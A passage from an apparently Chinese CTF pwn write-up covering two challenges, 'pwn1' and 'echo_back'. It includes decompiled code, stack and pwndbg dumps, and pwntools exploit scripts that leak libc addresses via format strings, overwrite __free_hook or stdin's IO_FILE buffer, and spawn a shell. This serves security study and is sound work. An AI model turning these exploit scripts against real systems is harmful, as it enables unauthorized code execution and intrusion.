class="built_in">snprintf</span>(&amp;v2, <span class="number">0x7D0</span>uLL, &amp;v3, &amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your Input Is :%s\n"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们输入到 s 变量里的字符串通过 sprintf 被复制到了 v2 变量里</p>
<p>但是 v2 变量距离 v3 变量只有 <code>0x7F0 - 0x408 == 0x3E8</code> 个，这时我们再输入两个字符就可以覆盖掉 <code>%s</code> 这个格式化字符，使其出现格式化字符串漏洞</p>
<p>程序格式化字符串地址分布大致如下，正常也可以调试地址，就是与 printf 有些区别，也不能显示下方格式化字符串栈空间的全部</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fff71310330</span>     ---- <span class="subst">%1</span>$p</span><br><span class="line"><span class="number">0x7fdb08cb6700</span>     ---- <span class="subst">%2</span>$p</span><br><span class="line"><span class="number">0x1999999999999999</span> ---- <span class="subst">%3</span>$p</span><br><span class="line"><span class="number">0x1999999999999999</span> ---- <span class="subst">%4</span>$p</span><br><span class="line">(nil)              ---- <span class="subst">%5</span>$p</span><br><span class="line"><span class="number">0x7fff71310b18</span>     ---- <span class="subst">%6</span>$p</span><br><span class="line"><span class="number">0x6161616161616161</span> ---- <span class="subst">%7</span>$p...<span class="subst">%259</span>$p</span><br><span class="line"><span class="number">0x7024303632256161</span> ---- <span class="subst">%260</span>$p</span><br><span class="line"><span class="number">0x2e7024313632252e</span> ---- <span class="subst">%261</span>$p</span><br><span class="line"><span class="number">0x252e702432363225</span> ---- <span class="subst">%262</span>$p</span><br><span class="line">(nil)              ---- <span class="subst">%263</span>$p...<span class="subst">%387</span>$p</span><br><span class="line"><span class="number">0x119a8c0012c42c00</span> ---- <span class="subst">%388</span>$p</span><br><span class="line"><span class="number">0x7ffca3f50ac0</span>     ---- <span class="subst">%389</span>$p</span><br><span class="line"><span class="number">0x55825a2a9cf9</span>     ---- <span class="subst">%390</span>$p</span><br><span class="line"><span class="number">0x7ffca3f50ba8</span>     ---- <span class="subst">%391</span>$p</span><br><span class="line"><span class="number">0x100000000</span>        ---- <span class="subst">%392</span>$p</span><br><span class="line"><span class="number">0x100000005</span>        ---- <span class="subst">%393</span>$p</span><br><span class="line"><span class="number">0x55825a2a9a00</span>     ---- <span class="subst">%394</span>$p</span><br><span class="line"><span class="number">0x7ffca3f50031</span>     ---- <span class="subst">%395</span>$p</span><br><span class="line"><span class="number">0x119a8c0012c42c00</span> ---- <span class="subst">%396</span>$p</span><br><span class="line"><span class="number">0x55825a2a9da0</span>     ---- <span class="subst">%397</span>$p</span><br><span class="line"><span class="number">0x7f3b03a20830</span>     ---- <span class="subst">%398</span>$p</span><br><span class="line"><span class="number">0x1</span>                ---- <span class="subst">%399</span>$p</span><br><span class="line"><span class="number">0x7ffca3f50ba8</span>     ---- <span class="subst">%400</span>$p</span><br></pre></td></tr></table></figure>

<p>改写内容的时候，要把改写的字符串放到 0x3EA 个字符后面，因为这样才会被 snprintf 解析为漏洞字符串</p>
<p>之后利用手段就是泄露 libc 地址，改写 __free_hook 为 system 地址，之后利用堆块的释放来提权</p>
<p>也可以泄露程序基地址，改写 got 表来提权</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="amd64", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">41193</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0xc05)\nc\nc")</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x3ea</span></span><br><span class="line">pd += <span class="string">'%398$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">'Input Your Code:\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Welcome To WHCTF2017:\n'</span>, pd)</span><br><span class="line">p.recvuntil(pd + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">addr___libc_start_main = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">libcbase = addr___libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr___free_hook = libcbase + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">list_system = list(p64(addr_system))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(list_system)):</span><br><span class="line">    pd = <span class="string">'a'</span> * <span class="number">0x3ea</span></span><br><span class="line">    pd += <span class="string">'%'</span> + str(<span class="number">2</span> + ord(list_system[i])) + <span class="string">'c%134$hhn'</span></span><br><span class="line">    pd = pd.ljust(<span class="number">0x3F8</span>, <span class="string">'b'</span>)</span><br><span class="line">    pd += p64(addr___free_hook + i)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input Your Code:\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Welcome To WHCTF2017:\n'</span>, pd)</span><br><span class="line">p.sendlineafter(<span class="string">'Input Your Code:\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Input Your Name:\n'</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Now!'</span>)</span><br><span class="line">success(<span class="string">'addr___libc_start_main = '</span> + hex(addr___libc_start_main))</span><br><span class="line">success(<span class="string">'addr___free_hook       = '</span> + hex(addr___free_hook))</span><br><span class="line">success(<span class="string">'addr_system            = '</span> + hex(addr_system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-13"><a href="#Flag-13" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="echo-back"><a href="#echo-back" class="headerlink" title="echo_back"></a>echo_back</h2><h3 id="Description-14"><a href="#Description-14" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution:"></a>Solution:</h3><p>保护全开</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p><strong>set_name 函数：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">sub_B45</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"name:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, a1, <span class="number">7u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>echo_back 函数：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_B80</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;nbytes + <span class="number">4</span>, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"length:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;nbytes);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (nbytes &amp; <span class="number">0x80000000</span>) != <span class="number">0L</span>L || nbytes &gt; <span class="number">6</span> )</span><br><span class="line">    LODWORD(nbytes) = <span class="number">7</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;nbytes + <span class="number">4</span>, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s say:"</span>, a1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"anonymous say:"</span>, &amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;nbytes + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题的技术是对 IO_FILE 的利用，利用方法如下：</p>
<p>我们可以依靠格式化字符串泄露出 libc 基地址和程序基地址从而掌握其他函数的偏移，但是格式化字符串的位置只能输入 7 个字符</p>
<p>先泄露出来<code>__libc_start_main + 240</code>的地址和程序基地址，算出<code>_IO_2_1_stdin_</code>的地址，然后利用<code>set_name</code>函数写入栈空间</p>
<p>原先这块内容是空的，写入了之后，我们利用格式化字符串可以看到该处的格式化字符串偏移是 16</p>
<p>我们写入<code>_IO_2_1_stdin_ + 0x38</code>的地址，即<code>_IO_2_1_stdin_</code>的<code>_IO_buf_base</code>字段</p>
<p>利用<code>%16$hhn</code>将该处的后两位改为<code>\x00</code>，之后<code>_IO_buf_base</code>就指向了<code>_IO_write_base</code>的位置</p>
<p>原本<code>_IO_buf_end</code>的值等于<code>_IO_buf_base</code>的值加一，<code>_IO_buf_base</code>原本指向<code>_shortbuf</code>，所以只能在这写入一个字节</p>
<p>现在<code>_IO_buf_base</code>指向<code>_IO_write_base</code>，而<code>_IO_buf_end</code>指向<code>_shortbuf + 1</code>，所以在使用<code>scanf</code>的时候可以在这读入很长的一段数据</p>
<p>修改<code>_IO_buf_base</code>的后两位为<code>\x00</code>后，<code>_IO_2_1_stdin_</code>结构体内容如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdin_</span><br><span class="line"><span class="number">$2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -<span class="number">72540021</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f5550d60964</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">""</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7f5550d60964</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">""</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f5550d60963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7f5550d60963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f5550d60963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7f5550d60963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7f5550d60900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt; <span class="string">"c\t\326PU\177"</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7f5550d60964</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">""</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = -<span class="number">1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">"\n"</span>, </span><br><span class="line">    _<span class="keyword">lock</span> = <span class="number">0x7f5550d62790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -<span class="number">1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f5550d609c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = -<span class="number">1</span>, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f5550d5f6e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后就要探讨如何才能提权了，这里先贴下源码</p>
<p>推荐一个查 linux 源码的网址，该函数内容来自：<code>https://code.woboq.org/userspace/glibc/libio/fileops.c</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> count;</span><br><span class="line">  <span class="comment">/* C99 requires EOF to be "sticky".  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn't</span></span><br><span class="line"><span class="comment">         required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">         traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">         not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">         explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">          == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">        _IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">                       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">         handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">         unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出以下两点：</p>
<p>1._IO_read_ptr &lt; _IO_read_end 时，函数直接返回 _IO_read_ptr</p>
<p>2.不然经过一系列操作后，会向 _IO_buf_base 中读入数据</p>
<p>使用 scanf 会从 _IO_buf_base 上面的地址开始写入，从而我们就有了任意地址写的能力，所以我们改掉指向<code>__libc_start_main + 240</code>的地址上面的值</p>
<p>然后写入<code>addr_rdi_ret + addr_bin_sh + addr_system</code>，但是这时不能写入，我们的<code>_IO_read_ptr</code>小于<code>_IO_read_end</code>，这样没法触发写入操作</p>
<p>于是就到<code>getchar()</code>函数的妙用，每调用一次该函数<code>_IO_read_ptr</code>就会<code>+1</code>，所以我们让程序先一直调用<code>getchar()</code>直到<code>_IO_read_ptr = _IO_read_end - 1</code></p>
<p>这里不等于是因为后面的输入还会让<code>_IO_read_ptr + 1</code>，然后写入<code>addr_rdi_ret + addr_bin_sh + addr_system</code>，再让程序退出即可提权</p>
<p>这里提醒一下，覆盖至<code>_IO_buf_end</code>时必须停止输入，后面的<code>_IO_save_base</code>如果有值，那么它在 scanf 中会被调用 free 函数释放掉，所以这里被改了会出错</p>
<p>最后说一句，这种需要 sleep 的题真的心累，运行一半卡住可太要命了</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="amd64", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./echo_back'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">54706</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./echo_back'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(set_name_payload)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, set_name_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_back</span><span class="params">(echo_back_payload)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'length:'</span>, <span class="string">'7'</span>)</span><br><span class="line">    p.send(echo_back_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo_back(<span class="string">'%6$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">mainbase = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0xef8</span></span><br><span class="line">echo_back(<span class="string">'%12$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">addr_ret = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">echo_back(<span class="string">'%19$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line"></span><br><span class="line">addr___libc_start_main = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">libcbase = addr___libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">addr__IO_2_1_stdin_ = libcbase + libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span 